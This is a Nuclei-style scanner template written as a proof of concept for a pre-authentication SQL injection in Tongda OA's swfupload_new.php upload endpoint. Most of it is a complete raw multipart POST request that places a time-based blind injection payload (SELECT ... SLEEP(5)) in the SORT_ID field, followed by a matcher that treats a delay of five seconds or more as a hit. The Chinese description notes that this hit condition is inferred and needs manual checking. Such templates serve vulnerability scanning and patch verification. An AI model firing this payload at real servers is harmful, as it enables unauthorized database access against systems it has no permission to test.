id: poc-bba650d4d4b6c7c8e99b
info:
  name: 通达OAswfupload_new存在前台SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,file-upload,2025
http:
- raw:
  - 'POST /general/file_folder/swfupload_new.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

    Content-Length: 355

    Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2

    Accept-Encoding: gzip


    ------------GFioQpMK0vv2

    Content-Disposition: form-data; name="ATTACHMENT_ID"


    1

    ------------GFioQpMK0vv2

    Content-Disposition: form-data; name="ATTACHMENT_NAME"


    1

    ------------GFioQpMK0vv2

    Content-Disposition: form-data; name="FILE_SORT"


    2

    ------------GFioQpMK0vv2

    Content-Disposition: form-data; name="SORT_ID"


    -@`''`  AND (SELECT 3397 FROM (SELECT(SLEEP(5)))jCdN)

    ------------GFioQpMK0vv2--'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
